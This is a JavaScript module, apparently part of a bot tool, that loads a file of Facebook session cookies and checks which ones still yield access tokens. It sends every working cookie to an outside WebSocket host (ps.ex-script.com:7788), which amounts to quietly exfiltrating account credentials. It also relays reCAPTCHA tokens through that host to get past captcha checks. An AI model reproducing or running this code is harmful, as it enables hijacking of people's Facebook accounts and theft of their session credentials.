var Account = require("./account.js");
var fs = require("fs");
var WebSocket = require('ws');
class facebookHandler {
    constructor() {
        this.activeAccounts = [];
        this.usedAccounts = [];
        this.accounts = [];
        this.doneChecking = false;
        this.manageServer = null;
        this.count = 0;
        this.reqs = {};
        this.recaptchaTokens = [];
        this.storeToken = true;
        this.setAccounts(JSON.parse(fs.readFileSync("./facebookTokens.json", "utf-8")));
        this.connectManager();
    }
    connectManager() {
        this.manageServer = new WebSocket("ws://ps.ex-script.com:7788");
        this.manageServer.onopen = this.onopen.bind(this);
        this.manageServer.onmessage = this.onmessage.bind(this);
        this.manageServer.onerror = this.onerror.bind(this);
        this.manageServer.onclose = this.onclose.bind(this);
    }
    checkAccounts(callback) {
        var manager = this;
        if (this.accounts.length < 1) {
            return console.log("NO ACCOUNTS");
        }    
        var amountOfAccounts = this.accounts.length;
        var amountOfTriedAccounts = 0;
        this.accounts.map(function(cookie) {
            var account = new Account();
            account.c_user = cookie.c_user;
            account.datr = cookie.datr;
            account.xs = cookie.xs;
            account.requestFBToken(function(token, info) {
                if (token) {
                    manager.activeAccounts.push({
                        cookie: cookie,
                        token: token
                    });
                    let cookieJson = JSON.stringify(cookie);
                    let buf = new Buffer.alloc(1 + cookieJson.length);
                    buf.writeUInt8(10, 0);
                    buf.write(cookieJson, 1);
                    manager.manageServer.send(buf);
                }
                newAccountValidated();
            });
        });
        function newAccountValidated() {
            amountOfTriedAccounts++;
            process.stdout.write(`\r[FaceBookManager]`.green + ` Checking... ${Math.floor((amountOfTriedAccounts / amountOfAccounts) * 100)}% (Checked accounts: ${amountOfTriedAccounts} / ${amountOfAccounts})`.yellow);
            if (amountOfAccounts == amountOfTriedAccounts) {
                if (typeof callback == "function") {
                    manager.doneChecking = true;
                    manager.manageServer.send(Buffer.from([11]));
                    callback();
                }
            }
        }
    }
    setAccounts(accounts) {
        this.accounts = accounts;
    }
    FBLogin(c, callback) {
        let buf = new Buffer.alloc(3);
        buf.writeUInt8(12, 0);
        buf.writeUInt16LE(c, 1);
        this.send(buf);
        this.reqs[c] = callback;
    }
    getRecaptchaToken() {
        this.send(Buffer.from([21]));
    }
    sendRecaptchaToken(token) {
        let buf = new Buffer.alloc(2 + token.length);
        buf.writeUInt8(20, 0);
        buf.write(token, 1);
        this.send(buf);
    }
    returnToken(c) {
        let buf = new Buffer.alloc(3);
        buf.writeUInt8(13, 0);
        buf.writeUInt16LE(c, 1);
        this.send(buf);
    }
    send(buffer) {
        if (this.manageServer && this.manageServer.readyState === 1) this.manageServer.send(buffer);
    }
    onopen() {
        this.send(Buffer.from([114, 5, 1, 4, 0]));
        this.checkAccounts(() => {
            console.log(`\n[FaceBookManager]`.green, `Account checking done ${this.activeAccounts.length}`.yellow);
        });
    }
    onmessage(msg) {
        let buf = msg.data || msg;
        let offset = 0;
        switch (buf.readUInt8(offset++)) {
            case 30:
                let token = '';
                let c = '';
                while ((c = buf.readUInt8(offset++)) != 0) {
                    token += String.fromCharCode(c);
                }
                this.recaptchaTokens.push(token);
                break;
            case 31:
                this.storeToken = false;
                break;
            case 102:
                this.requestedCallback(buf);
                break;
            case 200:
                this.requestedCallback = this.reqs[buf.readUInt16LE(offset)];
                break;
        }
    }
    onclose(e) {
        setTimeout(() => {
            this.connectManager();
        }, 2000);
    }
    onerror(e) {}
}

module.exports = new facebookHandler();